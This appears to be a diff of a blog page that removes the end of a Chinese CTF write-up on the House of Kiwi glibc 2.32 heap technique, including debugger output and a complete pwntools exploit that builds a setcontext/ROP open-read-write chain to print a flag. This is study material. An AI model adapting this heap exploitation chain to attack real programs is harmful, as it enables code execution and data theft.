-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f8bed8866e8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f8bed8866e8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f8bed8866f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f8bed8866f8</span> —▸ <span class="number">0x55e24e3f2010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f8bed886700</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f8bed886708</span> —▸ <span class="number">0x7f8beda6cba0</span> (main_arena) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
-<p>进行攻击后：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f8bed8866e8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f8bed8866e8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f8bed8866f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f8bed8866f8</span> —▸ <span class="number">0x55e24e3f3350</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f8bed886700</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f8bed886708</span> —▸ <span class="number">0x7f8beda6cba0</span> (main_arena) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
-<p>而 <code>0x350</code> 也是可控地址，申请这片区域然后在此伪造 fake tcache struct，分别布置好 <code>IO_file_jumps+0x60</code>， <code>IO_helper_jumps+0xa0</code>， <code>top_heap</code></p>
-<p>House Of Kiwi 的攻击基本上已经完成了</p>
-<p>完整 exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> asyncore <span class="keyword">import</span> write</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">num</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content=<span class="string">&#x27;\x00&#x27;</span></span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0x11B2)\nb *$rebase(0x11C2)\nb *$rebase(0x1183)\n&quot;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x1f8</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x438</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>,<span class="number">0x428</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xc91</span>)) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3 0x2b0</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#2 0xd20 - over \x00 to bk/fd</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5 0x370</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># 0x2b0 - bk=0xd20</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># 0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">&quot;\x00&quot;</span>) <span class="comment">#2 修复fd-&gt;bk(低位覆盖\x00)</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># 0xd20</span></span><br><span class="line">free(<span class="number">5</span>) <span class="comment"># 0x350 - fd=0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x9f8</span>) <span class="comment">#3 make 0x350 to large </span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#5 修复bk-&gt;fd(低位覆盖\x00)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x200</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xc90</span>))</span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># unlink</span></span><br><span class="line">add(<span class="number">0x430</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,p64(<span class="number">0x421</span>))) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x1600</span>) <span class="comment">#9</span></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1e4230</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x2b0</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_base: &#x27;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">setcontext=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">open_libc=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_libc=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_libc=libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;setcontext &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(setcontext))</span><br><span class="line"></span><br><span class="line">IO_file_jumps=<span class="number">0x1e54c0</span>+libc_base</span><br><span class="line">IO_helper_jumps=<span class="number">0x1e48c0</span>+libc_base</span><br><span class="line">success(<span class="string">&quot;IO_file_jumps &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(IO_file_jumps))</span><br><span class="line">success(<span class="string">&quot;IO_helper_jumps &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(IO_helper_jumps))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x2858f</span>+libc_base</span><br><span class="line">pop_rsi_ret=<span class="number">0x2ac3f</span>+libc_base</span><br><span class="line">pop_rdx_pop_rbx_ret=<span class="number">0x1597d6</span>+libc_base</span><br><span class="line">ret=<span class="number">0x26699</span>+libc_base</span><br><span class="line">success(<span class="string">&quot;pop_rdi_ret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pop_rdi_ret))</span><br><span class="line">success(<span class="string">&quot;pop_rsi_ret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pop_rsi_ret))</span><br><span class="line">success(<span class="string">&quot;pop_rdx_pop_rbx_ret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pop_rdx_pop_rbx_ret))</span><br><span class="line">success(<span class="string">&quot;ret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(ret))</span><br><span class="line"></span><br><span class="line">TLS=libc_base-<span class="number">0x2908</span></span><br><span class="line">success(<span class="string">&quot;TLS &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(TLS))</span><br><span class="line"></span><br><span class="line">ORW_addr = heap+<span class="number">0x8e0</span></span><br><span class="line">flag_addr = heap + <span class="number">0x8e0</span> + <span class="number">0x268</span></span><br><span class="line">chain = flat(pop_rdi_ret , flag_addr , pop_rsi_ret , <span class="number">0</span> , open_libc)</span><br><span class="line">chain +=flat(pop_rdi_ret , <span class="number">3</span> , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , <span class="number">0x100</span> , <span class="number">0</span> , read_libc)</span><br><span class="line">chain +=flat(pop_rdi_ret , <span class="number">1</span> , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , <span class="number">0x100</span> , <span class="number">0</span> , write_libc).ljust(<span class="number">0x200</span>,<span class="string">&#x27;\x00&#x27;</span>) + <span class="string">&#x27;./flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1240</span>,<span class="number">0x208</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x431</span>)+<span class="number">0x428</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x211</span>)+<span class="number">0x208</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xa01</span>)) <span class="comment"># padding-不要破坏原来的chunk结构</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x440</span>,chain) <span class="comment"># 0-chain</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#12</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1240</span>,<span class="number">0x208</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x431</span>)+p64(libc_base+<span class="number">0x1e3ff0</span>)*<span class="number">2</span>+p64(heap+<span class="number">0x1350</span>)+p64(TLS-<span class="number">0x20</span>)) <span class="comment">#4</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># largebin attack</span></span><br><span class="line">add(<span class="number">0x410</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x1240</span>,<span class="number">0x208</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x431</span>)+p64(libc_base+<span class="number">0x1e3ff0</span>)*<span class="number">2</span>+p64(heap+<span class="number">0x1350</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">top_heap = heap+<span class="number">0x46f0</span></span><br><span class="line">fake_tcache_struct=<span class="string">&#x27;\x01&#x27;</span>*<span class="number">0x70</span></span><br><span class="line">fake_tcache_struct=fake_tcache_struct.ljust(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(IO_file_jumps+<span class="number">0x60</span>)</span><br><span class="line">fake_tcache_struct=fake_tcache_struct.ljust(<span class="number">0x168</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(IO_helper_jumps+<span class="number">0xa0</span>)+p64(top_heap)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x420</span>,fake_tcache_struct) <span class="comment">#13</span></span><br><span class="line">add(<span class="number">0x100</span>,p64(setcontext+<span class="number">61</span>))</span><br><span class="line">add(<span class="number">0x200</span>,p64(ORW_addr)+p64(ret))</span><br><span class="line">add(<span class="number">0x210</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x910</span>))</span><br><span class="line"></span><br><span class="line">size = <span class="number">0x1000</span></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<hr>
-<p><strong>小结：</strong></p>
-<p>这个题的堆风水真是够呛，好在让我整理学习了一些思路，以后按照这个来改应该没有问题</p>
-<p>我还重新复习了下 off-by-one 和 unlink 的基础检查，各个 libc 版本的源码都对比着看了看，算是把以前的东西捡起来了吧</p>
-<p>学习使用了 House Of Kiwi</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2053,7 +2347,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">135</span>
+          <span class="site-state-item-count">137</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2066,7 +2360,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">96</span>
+        <span class="site-state-item-count">97</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -2107,7 +2401,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">26:52</span>
+    <span title="Reading time total">27:04</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
